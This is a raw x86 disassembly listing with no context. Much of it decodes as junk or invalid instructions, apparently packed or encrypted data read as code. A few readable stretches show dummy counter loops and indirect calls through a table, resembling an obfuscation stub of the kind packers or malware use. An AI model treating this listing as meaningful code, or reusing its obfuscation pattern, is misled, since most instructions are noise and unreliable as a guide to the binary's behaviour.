  40a176:	sbb    ebp,DWORD PTR [edi+edi*8+0x3d74753d]
  40a17d:	ins    DWORD PTR es:[edi],dx
  40a17e:	fld    DWORD PTR [edx]
  40a180:	stos   BYTE PTR es:[edi],al
  40a181:	xor    eax,0xdfb3024a
  40a186:	xchg   edx,eax
  40a187:	into   
  40a188:	or     BYTE PTR fs:[ebp-0x64],ah
  40a18c:	repnz movs WORD PTR es:[edi],WORD PTR ds:[esi]
  40a18f:	loop   0x40a15a
  40a191:	and    eax,DWORD PTR [ebp+0x31]
  40a194:	push   cs
  40a195:	fild   DWORD PTR ds:0xe649c517
  40a19b:	add    eax,0xb7472989
  40a1a0:	mov    edi,0xdb62c920
  40a1a5:	imul   BYTE PTR [ebx]
  40a1a7:	xor    eax,0xd1f51d8e
  40a1ac:	add    DWORD PTR [ebx+0x7f],ebp
  40a1af:	xchg   ecx,eax
  40a1b0:	add    esi,DWORD PTR [eax-0x62015d52]
  40a1b6:	hlt    
  40a1b7:	mov    ebp,0xd24ac573
  40a1bc:	lea    edi,ds:0x3ea38026
  40a1c2:	ret    
  40a1c3:	repz popa 
  40a1c5:	and    esp,DWORD PTR [ebp+ebx*4-0x68]
  40a1c9:	sub    BYTE PTR [edx-0x2d],0x18
  40a1cd:	cwde   
  40a1ce:	adc    DWORD PTR [ebp-0x9],0x68fa2f9a
  40a1d5:	mov    edi,0xf3c5bea2
  40a1da:	inc    esi
  40a1db:	nop
  40a1dc:	aam    0xc6
  40a1de:	sub    edi,DWORD PTR [ecx-0x5729ccfc]
  40a1e4:	pushf  
  40a1e5:	addr16 pop edi
  40a1e7:	ds in  al,dx
  40a1e9:	mov    bl,0x1e
  40a1eb:	sbb    dl,BYTE PTR [esi+eax*4-0x1fedece7]
  40a1f2:	and    cl,BYTE PTR cs:[edx+0x56]
  40a1f6:	mov    dl,0x88
  40a1f8:	fadd   st(7),st
  40a1fa:	cdq    
  40a1fb:	or     cl,BYTE PTR [edx-0x48a99fa2]
  40a201:	push   0xffffffac
  40a203:	add    BYTE PTR [ebx-0x49],al
  40a206:	xchg   BYTE PTR ds:0x2e33da89,dh
  40a20c:	outs   dx,BYTE PTR ds:[esi]
  40a20d:	lods   eax,DWORD PTR ds:[esi]
  40a20e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a20f:	fadd   QWORD PTR [edi]
  40a211:	inc    edx
  40a212:	(bad)  
  40a213:	fdiv   st(1),st
  40a215:	(bad)  
  40a217:	xchg   ecx,eax
  40a218:	pop    eax
  40a219:	imul   edi,DWORD PTR [esi+edx*1-0x31],0xffffffc3
  40a21e:	lods   eax,DWORD PTR ds:[esi]
  40a21f:	lods   eax,DWORD PTR ds:[esi]
  40a220:	call   0xb1c2:0xe9e160b6
  40a227:	xchg   BYTE PTR [esi],cl
  40a229:	js     0x40a2a7
  40a22b:	pop    ebx
  40a22c:	sbb    ebx,DWORD PTR [eax-0x39]
  40a22f:	inc    ebp
  40a230:	cld    
  40a231:	rol    DWORD PTR [ebp+0x45c7f89c],1
  40a237:	fdiv   DWORD PTR [ebx]
  40a239:	test   DWORD PTR [eax+edi*8+0x45c7d213],ebx
  40a240:	aam    0x32
  40a242:	test   DWORD PTR [eax+edi*8-0x392da7f],ebx
  40a249:	inc    edx
  40a24a:	add    BYTE PTR [eax],al
  40a24c:	add    BYTE PTR [eax],al
  40a24e:	add    cl,ch
  40a250:	sldt   WORD PTR [eax]
  40a253:	add    BYTE PTR [ebx],dh
  40a255:	ror    BYTE PTR [ebx],cl
  40a257:	adc    eax,0x42fc6d
  40a25c:	inc    edx
  40a25d:	mov    DWORD PTR ds:0x42fc6d,edx
  40a263:	cmp    DWORD PTR ds:0x42fc6d,0x10
  40a26a:	jae    0x40a2a2
  40a270:	cmp    DWORD PTR ds:0x42fc6d,0x14
  40a277:	jne    0x40a297
  40a27d:	push   0x83c5
  40a282:	push   0x5a78
  40a287:	push   0x49ef
  40a28c:	push   0x22e4
  40a291:	call   DWORD PTR ds:0x42e267
  40a297:	jmp    0x40a254
  40a29c:	add    DWORD PTR ds:0x42e0a8,edx
  40a2a2:	mov    DWORD PTR [ebp-0x30],0xf89c853d
  40a2a9:	and    DWORD PTR ds:0x42e68f,0x7d59
  40a2b3:	jmp    0x40a671
  40a2b8:	into   
  40a2b9:	iret   
  40a2ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a2bb:	cmp    esp,DWORD PTR [ebp+0x7cc97171]
  40a2c1:	sbb    bl,BYTE PTR [edi+0x2b]
  40a2c4:	loopne 0x40a2d8
  40a2c6:	call   FWORD PTR ds:0x7070f545
  40a2cc:	lahf   
  40a2cd:	jge    0x40a33f
  40a2cf:	jo     0x40a33e
  40a2d1:	in     al,0x70
  40a2d3:	inc    edi
  40a2d4:	call   0xd6a3:0x9d554a54
  40a2db:	xchg   ebx,eax
  40a2dc:	loop   0x40a340
  40a2de:	or     edi,esi
  40a2e0:	(bad)  
  40a2e1:	and    DWORD PTR [ebx],ebx
  40a2e3:	stc    
  40a2e4:	imul   ebx,esp,0xfffffff1
  40a2e7:	shl    DWORD PTR [edx-0x2cdf33fb],1
  40a2ed:	push   ds
  40a2ee:	push   cs
  40a2ef:	xor    BYTE PTR [edx-0x172282ce],bl
  40a2f5:	fst    QWORD PTR [ebx-0x6c]
  40a2f8:	add    ebp,eax
  40a2fa:	outs   dx,BYTE PTR ds:[esi]
  40a2fb:	xchg   ebx,eax
  40a2fc:	and    DWORD PTR ds:0xad6d29b1,eax
  40a302:	(bad)  
  40a303:	push   eax
  40a304:	in     eax,dx
  40a305:	cwde   
  40a306:	xor    esp,DWORD PTR [esi]
  40a308:	adc    DWORD PTR [edi],0x52
  40a30b:	inc    ecx
  40a30c:	sbb    DWORD PTR [edx],0x5e
  40a30f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a310:	xchg   BYTE PTR ds:0x65c0f706,bh
  40a316:	xchg   ebp,eax
  40a317:	inc    ebx
  40a318:	xchg   DWORD PTR [eax],ebx
  40a31a:	sub    eax,DWORD PTR [esi]
  40a31c:	outs   dx,BYTE PTR ds:[esi]
  40a31d:	in     eax,dx
  40a31e:	jae    0x40a33b
  40a320:	and    eax,0x136bb11b
  40a325:	add    BYTE PTR [ecx+esi*8],ch
  40a328:	repnz loope 0x40a2cd
  40a32b:	mov    al,0xc4
  40a32d:	dec    eax
  40a32e:	int3   
  40a32f:	leave  
  40a330:	cld    
  40a331:	and    eax,0xb8f302f4
  40a336:	ficomp WORD PTR [edx+edi*1]
  40a339:	jmp    0x528df121
  40a33e:	stos   BYTE PTR es:[edi],al
  40a33f:	mov    ecx,0x5945b114
  40a344:	mov    ?,WORD PTR [esp+eiz*2]
  40a347:	inc    eax
  40a348:	(bad)  
  40a34a:	(bad)  
  40a34b:	push   ds
  40a34c:	mov    WORD PTR [ecx+0x6b8f0109],fs
  40a352:	jmp    0x40a30c
  40a354:	inc    ebp
  40a355:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a356:	enter  0x35ff,0x4d
  40a35a:	pop    ecx
  40a35b:	ja     0x40a393
  40a35d:	(bad)  
  40a35e:	cmp    al,0x59
  40a360:	idiv   DWORD PTR [edx-0x6f]
  40a363:	ffreep st(4)
  40a365:	sbb    BYTE PTR ds:0x379c8056,0xab
  40a36c:	call   0x7f8f:0x987ccfd0
  40a373:	stc    
  40a374:	aas    
  40a375:	xor    eax,0x953dac14
  40a37a:	sub    al,0x3e
  40a37c:	jmp    0x9224:0x40e67c82
  40a383:	dec    edi
  40a384:	sti    
  40a385:	std    
  40a386:	xchg   edx,eax
  40a387:	sub    eax,DWORD PTR [edi+0x768600d6]
  40a38d:	int3   
  40a38e:	pushf  
  40a38f:	xchg   DWORD PTR [ecx],esp
  40a391:	mov    bh,0x53
  40a393:	push   edx
  40a394:	xlat   BYTE PTR ds:[ebx]
  40a395:	push   ebp
  40a396:	jecxz  0x40a33b
  40a398:	mov    ecx,0x7e4bc107
  40a39d:	test   DWORD PTR [eax+0x6945f22b],eax
  40a3a3:	jae    0x40a3cd
  40a3a5:	mov    esi,0xc09ce5aa
  40a3aa:	bound  esi,QWORD PTR [ebp+0x2ad97446]
  40a3b0:	mov    dh,0x84
  40a3b2:	ins    BYTE PTR es:[edi],dx
  40a3b3:	push   ecx
  40a3b4:	or     eax,0x1ca283e2
  40a3b9:	repnz adc al,0x90
  40a3bc:	(bad)  
  40a3bd:	push   ecx
  40a3be:	imul   ebp,DWORD PTR [esi+0xc],0xffffffb6
  40a3c2:	cld    
  40a3c3:	dec    DWORD PTR [edi+edx*4+0x16]
  40a3c7:	out    dx,eax
  40a3c8:	imul   eax,ebx,0x29233e89
  40a3ce:	pop    edx
  40a3cf:	aad    0x54
  40a3d1:	imul   ebx,DWORD PTR [edx+0x7d4d7393],0x2a
  40a3d8:	xchg   esp,eax
  40a3d9:	mov    al,ds:0xaba6e362
  40a3de:	dec    edx
  40a3df:	mov    ah,BYTE PTR [edx+0x772b560e]
  40a3e5:	sub    al,dl
  40a3e7:	mov    ah,ah
  40a3e9:	pop    ds
  40a3ea:	jle    0x40a38e
  40a3ec:	push   ds
  40a3ed:	mov    al,ds:0x1c85a3a6
  40a3f2:	sbb    DWORD PTR [esi+0x2f26a987],esp
  40a3f8:	leave  
  40a3f9:	jl     0x40a41f
  40a3fb:	fld    TBYTE PTR [ebx+0x2d]
  40a3fe:	push   eax
  40a3ff:	xchg   edi,eax
  40a400:	jne    0x40a3c7
  40a402:	pop    ds
  40a403:	dec    esp
  40a404:	stos   BYTE PTR es:[edi],al
  40a405:	sti    
  40a406:	dec    eax
  40a407:	adc    eax,0x30707e7f
  40a40c:	jle    0x40a39a
  40a40e:	or     cl,BYTE PTR [ecx]
  40a410:	outs   dx,DWORD PTR ds:[esi]
  40a411:	mov    cl,0xb3
  40a413:	ret    0x58d3
  40a416:	rcr    eax,cl
  40a418:	and    bl,ah
  40a41a:	(bad)  
  40a41b:	ror    DWORD PTR [edi],cl
  40a41d:	pop    ds
  40a41e:	sbb    ah,BYTE PTR [ecx]
  40a420:	inc    edx
  40a421:	adc    al,0x43
  40a423:	call   0xeba6d533
  40a428:	push   edi
  40a429:	sub    bl,bl
  40a42b:	push   eax
  40a42c:	and    al,0x4d
  40a42e:	adc    ah,ch
  40a430:	xchg   ecx,eax
  40a431:	test   dl,0x57
  40a434:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a435:	sub    ebx,DWORD PTR [eax+ebx*8-0x3e]
  40a439:	xchg   ebx,eax
  40a43a:	pop    esp
  40a43b:	xchg   edi,eax
  40a43c:	mov    DWORD PTR [ecx],eax
  40a43e:	pop    es
  40a43f:	sub    al,0xbf
  40a441:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a442:	jecxz  0x40a3e3
  40a444:	sub    BYTE PTR [ecx+0x1856f56f],dh
  40a44a:	cmp    esp,DWORD PTR [esi+0x1b]
  40a44d:	inc    ebx
  40a44e:	or     edi,DWORD PTR [esi-0x4d]
  40a451:	ins    BYTE PTR es:[edi],dx
  40a452:	(bad)  
  40a454:	fwait
  40a455:	(bad)  
  40a456:	in     al,dx
  40a457:	je     0x40a4d8
  40a459:	imul   ecx,DWORD PTR [ebx+eax*4],0x12e9477c
  40a460:	push   esi
  40a461:	imul   edi,DWORD PTR [ecx+ecx*8-0x2ef5a7e5],0x7e
  40a469:	stos   BYTE PTR es:[edi],al
  40a46a:	xchg   ebx,eax
  40a46b:	loopne 0x40a451
  40a46d:	add    dl,BYTE PTR [edx+ebx*8]
  40a470:	sbb    BYTE PTR [edx+0x26],dh
  40a473:	es jno 0x40a4b1
  40a476:	pop    esp
  40a477:	and    al,0xc6
  40a479:	imul   esp,DWORD PTR [ecx],0xaebec426
  40a47f:	mov    edx,DWORD PTR [edi+0x6c]
  40a482:	mov    ch,0x4
  40a484:	lahf   
  40a485:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a486:	mov    WORD PTR [edi+0x46],?
  40a489:	adc    ch,BYTE PTR [eax-0x5e70ef84]
  40a48f:	(bad)  
  40a490:	in     eax,0x39
  40a492:	test   eax,0x95ce1b4a
  40a497:	or     bl,BYTE PTR ds:0xa688a8c5
  40a49d:	cmp    al,0xf5
  40a49f:	cmp    DWORD PTR [esi],esi
  40a4a1:	clc    
  40a4a2:	nop
  40a4a3:	lds    eax,FWORD PTR ds:0x1542a3d0
  40a4a9:	dec    edx
  40a4aa:	into   
  40a4ab:	jmp    0x8b14851f
  40a4b0:	js     0x40a4ba
  40a4b2:	fwait
  40a4b3:	sahf   
  40a4b4:	pop    ebp
  40a4b5:	jo     0x40a514
  40a4b7:	dec    ebp
  40a4b8:	call   0xc072:0x53417e76
  40a4bf:	or     eax,0x6b53666e
  40a4c4:	dec    eax
  40a4c5:	pop    edi
  40a4c6:	fisttp QWORD PTR [esi-0x5a103cef]
  40a4cc:	inc    DWORD PTR [edx+0x74]
  40a4cf:	pop    esp
  40a4d0:	in     al,dx
  40a4d1:	mov    bl,0x85
  40a4d3:	adc    bl,bh
  40a4d5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a4d6:	out    0x16,al
  40a4d8:	mov    dl,al
  40a4da:	mov    ds:0x89a5db25,al
  40a4df:	scas   al,BYTE PTR es:[edi]
  40a4e0:	or     BYTE PTR [ebp+0x22bb0200],ah
  40a4e6:	pop    ss
  40a4e7:	repnz dec ebx
  40a4e9:	aas    
  40a4ea:	fs lods eax,DWORD PTR ss:[esi]
  40a4ed:	jle    0x40a4c5
  40a4ef:	dec    esp
  40a4f0:	repnz retf 
  40a4f2:	push   edi
  40a4f3:	add    eax,0xf6b67e90
  40a4f8:	xchg   ecx,eax
  40a4f9:	mov    BYTE PTR [edx+eax*8+0xd],0xb7
  40a4fe:	das    
  40a4ff:	dec    ecx
  40a500:	lahf   
  40a501:	inc    edx
  40a502:	sar    BYTE PTR [esi+edi*8-0x70],cl
  40a506:	ins    DWORD PTR es:[edi],dx
  40a507:	(bad)  
  40a508:	sahf   
  40a509:	and    esp,DWORD PTR cs:[edi+0x74]
  40a50d:	hlt    
  40a50e:	sbb    eax,0xffffffa5
  40a511:	mov    al,ds:0x49df2433
  40a516:	enter  0x3702,0xb9
  40a51a:	(bad)
  40a51e:	shr    cl,1
  40a520:	in     eax,dx
  40a521:	push   si
  40a523:	fdivr  DWORD PTR ds:0xf44803b2
  40a529:	mov    cl,0x88
  40a52b:	(bad)  
  40a52c:	hlt    
  40a52d:	inc    edi
  40a52e:	dec    ebp
  40a52f:	and    ebp,DWORD PTR [esi+0x37c5fa33]
  40a535:	inc    edx
  40a536:	or     al,0xb0
  40a538:	add    eax,0x61d517b3
  40a53d:	adc    eax,0x23808b4
  40a542:	inc    ebp
  40a543:	add    al,0x6a
  40a545:	call   0xe07e:0x19991696
  40a54c:	enter  0x5ae0,0xd1
  40a550:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a551:	xchg   edx,eax
  40a552:	mov    ah,0xc2
  40a554:	pushf  
  40a555:	aaa    
  40a556:	in     eax,0x22
  40a558:	add    BYTE PTR [eax-0x49],0xd3
  40a55c:	pop    ebp
  40a55d:	mov    DWORD PTR [esi+edx*1+0x4a],ebp
  40a561:	mov    BYTE PTR [edi-0xbc96dbf],al
  40a567:	pop    ss
  40a568:	or     al,0x2b
  40a56a:	test   eax,0x69db4d68
  40a56f:	and    al,BYTE PTR [eax-0x39]
  40a572:	mov    WORD PTR [edx-0x735ee907],?
  40a578:	fld    st(6)
  40a57a:	push   eax
  40a57b:	addr16 push eax
  40a57d:	cmc    
  40a57e:	sbb    eax,0xbace8744
  40a583:	popa   
  40a584:	mov    cl,0x94
  40a586:	dec    edx
  40a587:	out    dx,al
  40a588:	xchg   esp,eax
  40a589:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a58a:	add    eax,0x51
  40a58d:	cmc    
  40a58e:	scas   al,BYTE PTR es:[edi]
  40a58f:	(bad)  
  40a591:	mov    ebx,0x8b95edc0
  40a596:	or     esp,ebx
  40a598:	xor    esi,esi
  40a59a:	ds sbb al,0x1a
  40a59d:	faddp  st(6),st
  40a59f:	mov    ecx,0x6ea0cff9
  40a5a4:	xor    eax,0x3a177cb5
  40a5a9:	fiadd  DWORD PTR [ebx+0x1d57a0d6]
  40a5af:	fwait
  40a5b0:	(bad)  
  40a5b1:	fwait
  40a5b2:	sbb    ch,al
  40a5b4:	xchg   esp,eax
  40a5b5:	lahf   
  40a5b6:	ret    0xab01
  40a5b9:	xor    BYTE PTR [bx+0x4f20],dl
  40a5be:	cmc    
  40a5bf:	or     bl,ch
  40a5c1:	jns    0x40a555
  40a5c3:	push   0x35
  40a5c5:	inc    ebp
  40a5c6:	mov    DWORD PTR [ecx-0x84b71e9],ebx
  40a5cc:	xor    BYTE PTR [ebp+ebx*8+0x3ccfb76c],0xf2
  40a5d4:	loop   0x40a630
  40a5d6:	nop
  40a5d7:	xchg   ch,dl
  40a5d9:	(bad)  
  40a5da:	cld    
  40a5db:	jb     0x40a563
  40a5dd:	out    dx,eax
  40a5de:	dec    ecx
  40a5df:	scas   eax,DWORD PTR es:[edi]
  40a5e0:	fisubr WORD PTR [esi-0x50]
  40a5e3:	jle    0x40a5ec
  40a5e5:	fwait
  40a5e6:	mov    eax,0x4b7fa7e7
  40a5eb:	mov    WORD PTR [esi+0x32],ss
  40a5ee:	xor    BYTE PTR [edx],bh
  40a5f0:	and    ebp,ecx
  40a5f2:	xchg   ecx,eax
  40a5f3:	mov    ss,WORD PTR [eax]
  40a5f5:	cs mov al,0x35
  40a5f8:	mov    ss,WORD PTR [ecx+0x44]
  40a5fb:	and    BYTE PTR [ebp-0xe],cl
  40a5fe:	daa    
  40a5ff:	pop    ebp
  40a600:	pop    edx
  40a601:	lahf   
  40a602:	imul   edi,DWORD PTR [ecx+0x589ee6c0],0x1876cb29
  40a60c:	sub    cl,BYTE PTR [ebx+0x3a6738f2]
  40a612:	pop    es
  40a613:	mov    al,0xe7
  40a615:	shl    BYTE PTR [edi+0x5b9051d],0x4c
  40a61c:	or     eax,0xe176c4d7
  40a621:	jb     0x40a5ae
  40a623:	cmp    DWORD PTR [esi-0x18],edx
  40a626:	fnsave ds:0xe306d372
  40a62c:	out    0x29,al
  40a62e:	sbb    al,0xb
  40a630:	(bad)  
  40a631:	data16 mov dl,0xa7
  40a634:	daa    
  40a635:	iret   
  40a636:	pop    esi
  40a637:	clc    
  40a638:	mov    ds:0xdb2d5160,al
  40a63d:	xor    BYTE PTR [ecx],cl
  40a63f:	hlt    
  40a640:	imul   ecx,DWORD PTR [ebx],0x17ab59b9
  40a646:	ins    DWORD PTR es:[edi],dx
  40a647:	xchg   ebx,eax
  40a648:	mov    edx,0x19668c67
  40a64d:	pusha  
  40a64e:	in     eax,0xdd
  40a650:	cmp    bl,BYTE PTR [esi+0x4c6a1b49]
  40a656:	push   ecx
  40a657:	imul   esi,DWORD PTR [ebx+eiz*1],0xda1bc1ee
  40a65e:	inc    edx
  40a65f:	sti    
  40a660:	outs   dx,BYTE PTR ds:[esi]
  40a661:	out    0xde,eax
  40a663:	mov    eax,0x46c2e665
  40a668:	pusha  
  40a669:	loopne 0x40a6d1
  40a66b:	in     al,dx
  40a66c:	fisubr WORD PTR [eax-0x38ab1cb2]
  40a672:	inc    ebp
  40a673:	int3   
  40a674:	cmp    al,0x85
  40a676:	pushf  
  40a677:	clc    
  40a678:	mov    DWORD PTR [ebp-0x38],0xf89c853f
  40a67f:	and    DWORD PTR ds:0x42e66f,0x0
  40a689:	xor    edx,edx
  40a68b:	or     edx,DWORD PTR ds:0x42e66f
  40a691:	inc    edx
  40a692:	mov    DWORD PTR ds:0x42e66f,edx
  40a698:	cmp    DWORD PTR ds:0x42e66f,0xf
  40a69f:	jne    0x40a6c6
  40a6a5:	push   DWORD PTR [ebp-0x28]
  40a6a8:	push   DWORD PTR [ebp-0x10]
  40a6ab:	push   0x42e677
  40a6b0:	push   DWORD PTR [ebp-0x14]
  40a6b3:	push   DWORD PTR [ebp-0x18]
  40a6b6:	push   0x89bc
  40a6bb:	push   0x39f6
  40a6c0:	call   DWORD PTR ds:0x42e26b
  40a6c6:	cmp    DWORD PTR ds:0x42e66f,0xe
  40a6cd:	jne    0x40a6e0
  40a6d3:	mov    edx,DWORD PTR ds:0x42e66f
  40a6d9:	inc    edx
  40a6da:	mov    DWORD PTR ds:0x42e66f,edx
  40a6e0:	cmp    DWORD PTR ds:0x42e66f,0x1c
  40a6e7:	jb     0x40a689
  40a6ed:	and    DWORD PTR ds:0x42fc5d,0x0
  40a6f7:	jmp    0x40a709
  40a6fc:	mov    edx,DWORD PTR ds:0x42fc5d
  40a702:	inc    edx
  40a703:	mov    DWORD PTR ds:0x42fc5d,edx
  40a709:	cmp    DWORD PTR ds:0x42fc5d,0x13
  40a710:	jae    0x40a766
  40a716:	cmp    DWORD PTR ds:0x42fc5d,0xb
  40a71d:	jne    0x40a733
  40a723:	push   0x42e1ed
  40a728:	push   0x42e1db
  40a72d:	call   DWORD PTR ds:0x42e4c7
  40a733:	cmp    DWORD PTR ds:0x42fc5d,0xa
  40a73a:	jne    0x40a74f
  40a740:	xor    edx,edx
  40a742:	add    edx,DWORD PTR ds:0x42fc5d
  40a748:	inc    edx
  40a749:	mov    DWORD PTR ds:0x42fc5d,edx
  40a74f:	jmp    0x40a6fc
  40a754:	mov    edi,DWORD PTR ds:0x42e0b4
  40a75a:	xor    edi,DWORD PTR ds:0x42e693
  40a760:	mov    DWORD PTR ds:0x42e0b4,edi
  40a766:	mov    DWORD PTR [ebp-0x3c],0xf89c853e
  40a76d:	adc    DWORD PTR ds:0x42e693,edx
  40a773:	mov    edx,DWORD PTR [ebp+0x8]
  40a776:	xor    edx,eax
  40a778:	sub    edi,DWORD PTR ds:0x42fc51
  40a77e:	mov    edi,DWORD PTR [ebp-0x10]
  40a781:	add    edx,ecx
  40a783:	mov    DWORD PTR ds:0x42fc65,0x29c7
  40a78d:	cmp    edi,edx
  40a78f:	mov    DWORD PTR ds:0x42e693,0x10c5
  40a799:	je     0x40d88b
  40a79f:	mov    DWORD PTR ds:0x42fc79,0x41c2
  40a7a9:	push   ebx
  40a7aa:	mov    DWORD PTR ds:0x42fc89,0x2602
  40a7b4:	jmp    0x40d4a8
  40a7b9:	mov    edx,DWORD PTR [ebp-0x8]
  40a7bc:	mov    DWORD PTR ds:0x42e0b0,0x1c
  40a7c6:	cmp    DWORD PTR ds:0x42e0b0,0x0
  40a7cd:	je     0x40a824
  40a7d3:	cmp    DWORD PTR ds:0x42e0b0,0x7
  40a7da:	jne    0x40a7f8
  40a7e0:	push   DWORD PTR [ebp-0x10]
  40a7e3:	push   0x42e167
  40a7e8:	push   0x42e1bd
  40a7ed:	push   0x42e1bd
  40a7f2:	call   DWORD PTR ds:0x42e26f
  40a7f8:	cmp    DWORD PTR ds:0x42e0b0,0x8
  40a7ff:	jne    0x40a812
  40a805:	mov    edi,DWORD PTR ds:0x42e0b0
  40a80b:	dec    edi
  40a80c:	mov    DWORD PTR ds:0x42e0b0,edi
  40a812:	mov    edi,DWORD PTR ds:0x42e0b0
  40a818:	dec    edi
  40a819:	mov    DWORD PTR ds:0x42e0b0,edi
  40a81f:	jmp    0x40a7c6
  40a824:	mov    edi,DWORD PTR [ebp-0x10]
  40a827:	xor    DWORD PTR ds:0x42e0ac,0x3333
  40a831:	sub    edi,edx
  40a833:	mov    edx,DWORD PTR ds:0x42fcee
  40a839:	add    DWORD PTR ds:0x42e687,edx
  40a83f:	mov    edx,DWORD PTR [ebp-0x4]
  40a842:	jmp    0x40ac00
  40a847:	addr16 sub al,0x5e
  40a84a:	xchg   esi,eax
  40a84b:	jno    0x40a89f
  40a84d:	ja     0x40a838
  40a84f:	dec    eax
  40a850:	(bad)  
  40a851:	in     al,dx
  40a852:	std    
  40a853:	out    dx,al
  40a854:	test   dh,0x8e
  40a857:	in     al,0xf1
  40a859:	jo     0x40a8cb
  40a85b:	lahf   
  40a85c:	jge    0x40a8ce
  40a85e:	jo     0x40a860
  40a860:	ins    BYTE PTR es:[edi],dx
  40a861:	push   ebx
  40a862:	fst    st(5)
  40a864:	pop    ss
  40a865:	push   ebx
  40a866:	imul   eax,DWORD PTR [ebx],0xf
  40a869:	mov    edi,0x21252964
  40a86e:	aaa    
  40a86f:	mov    ecx,0xd2c1402b
  40a874:	mul    DWORD PTR [edx]
  40a876:	ja     0x40a811
  40a878:	fidivr DWORD PTR [edi]
  40a87a:	out    0x25,eax
  40a87c:	jns    0x40a889
  40a87e:	in     eax,dx
  40a87f:	and    BYTE PTR [edx],cl
  40a881:	push   edi
  40a882:	(bad)  
  40a883:	push   ebp
  40a884:	and    edi,esp
  40a886:	jl     0x40a823
  40a888:	jno    0x40a8f6
  40a88a:	push   edi
  40a88b:	adc    eax,0x66076a50
  40a890:	sbb    BYTE PTR [eax+ebx*2+0x4293fe6e],cl
  40a897:	mov    dh,0xf2
  40a899:	or     DWORD PTR [eax+eax*1-0x1a],esi
  40a89d:	adc    eax,0x1ee1e301
  40a8a2:	ins    DWORD PTR es:[edi],dx
  40a8a3:	fwait
  40a8a4:	inc    ecx
  40a8a5:	xchg   ecx,eax
  40a8a6:	stc    
  40a8a7:	cmp    al,0xaa
  40a8a9:	sbb    al,bl
  40a8ab:	push   ebp
  40a8ac:	inc    edx
  40a8ad:	dec    esi
  40a8ae:	mov    ch,0x20
  40a8b0:	push   ds
  40a8b1:	enter  0x8569,0xc1
  40a8b5:	ror    dl,1
  40a8b7:	(bad)  
  40a8b8:	jne    0x40a83f
  40a8ba:	lahf   
  40a8bb:	pop    ss
  40a8bc:	mov    al,ds:0x412e9c31
  40a8c1:	out    dx,al
  40a8c2:	stos   DWORD PTR es:[edi],eax
  40a8c3:	rcr    BYTE PTR [ebp+ebp*1+0x3f4fc4a0],1
  40a8ca:	push   ebx
  40a8cb:	xchg   ecx,eax
  40a8cc:	call   esi
  40a8ce:	test   BYTE PTR [edi],ah
  40a8d0:	sub    edx,DWORD PTR [edi+0x444b3928]
  40a8d6:	push   esi
  40a8d7:	xor    BYTE PTR [edi+0x838425a],0xd0
  40a8de:	mov    dh,dl
  40a8e0:	dec    eax
  40a8e1:	or     eax,0x2bca74a5
  40a8e6:	je     0x40a925
  40a8e8:	xchg   ebx,eax
  40a8e9:	pop    es
  40a8ea:	stos   DWORD PTR es:[edi],eax
  40a8eb:	inc    ecx
  40a8ec:	xor    DWORD PTR [ecx],esp
  40a8ee:	lds    edi,FWORD PTR [esi]
  40a8f0:	aam    0x5e
  40a8f2:	inc    edx
  40a8f3:	fucomi st,st(6)
  40a8f5:	pop    es
  40a8f6:	mov    eax,ds:0x5678c088
  40a8fb:	sbb    eax,0x9041a685
  40a900:	dec    edx
  40a901:	lods   al,BYTE PTR ds:[esi]
  40a902:	push   esi
  40a903:	and    bh,bl
  40a905:	stc    
  40a906:	rol    BYTE PTR [ebx+0x2995f36a],cl
  40a90c:	and    DWORD PTR [ebp+0x7467b4a1],0xffffffb4
  40a913:	pop    eax
  40a914:	and    BYTE PTR [edi+ecx*1-0x31e7ed39],ah
  40a91b:	rcl    BYTE PTR es:[ebp-0x5c],0x7
  40a920:	sbb    eax,0x27638572
  40a925:	xchg   edx,eax
  40a926:	inc    edi
  40a927:	inc    edi
  40a928:	inc    eax
  40a929:	add    esi,DWORD PTR [ecx]
  40a92b:	xchg   edx,eax
  40a92c:	ret    0xe60b
  40a92f:	xchg   ecx,eax
  40a930:	mov    esi,0xbadd566
  40a935:	rsqrtps xmm0,XMMWORD PTR [edx+edx*2+0x65f25fe]
  40a93d:	inc    edx
  40a93e:	pop    ebp
  40a93f:	push   ecx
  40a940:	push   esi
  40a941:	add    bl,cl
  40a943:	cmp    BYTE PTR ds:0x7f36cffc,al
  40a949:	clc    
  40a94a:	xor    al,0xa3
  40a94c:	mov    edx,0x9f3c921f
  40a951:	dec    ebx
  40a952:	xchg   ebx,eax
  40a953:	jae    0x40a9d2
  40a955:	frstor [ebx+edx*1+0xfe2b6c]
  40a95c:	add    edx,DWORD PTR [edi-0x55174673]
  40a962:	sub    BYTE PTR [edi+0x32bc82cc],al
  40a968:	loopne 0x40a979
  40a96a:	int    0x52
  40a96c:	lds    esi,FWORD PTR ds:0xdc25bc8c
  40a972:	(bad)  
  40a973:	push   ebp
  40a974:	(bad)  [ebp-0x6a148451]
  40a97a:	sbb    DWORD PTR [ebx+0x4c],0x77
  40a97e:	mov    ebx,DWORD PTR [ebp+ebx*1+0x3eb7d9a0]
  40a985:	push   ebx
  40a986:	ret    
  40a987:	aas    
  40a988:	and    ch,dl
  40a98a:	mov    edx,0xaf40cb73
  40a98f:	out    dx,eax
  40a990:	push   es
  40a991:	enter  0x4fc7,0x81
  40a995:	jbe    0x40a9e5
  40a997:	jg     0x40a9ff
  40a999:	push   0x29
  40a99b:	push   ss
  40a99c:	mov    ds:0x2aa632ae,eax
  40a9a1:	gs loop 0x40a9e8
  40a9a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a9a5:	xchg   ebp,eax
  40a9a6:	popw   ss
  40a9a8:	jno    0x40a9eb
  40a9aa:	sbb    DWORD PTR es:[eax+0x44518f5e],esp
  40a9b1:	test   DWORD PTR [edx+0x59],0xb528b693
  40a9b8:	int3   
  40a9b9:	cmp    eax,0x625d66db
  40a9be:	mov    BYTE PTR [ebx],ch
  40a9c0:	imul   esp,DWORD PTR [eax+0x16],0xd910bef5
  40a9c7:	inc    eax
  40a9c8:	xor    esi,DWORD PTR [eax]
  40a9ca:	mov    edi,0x6c7ac0f6
  40a9cf:	push   0x63
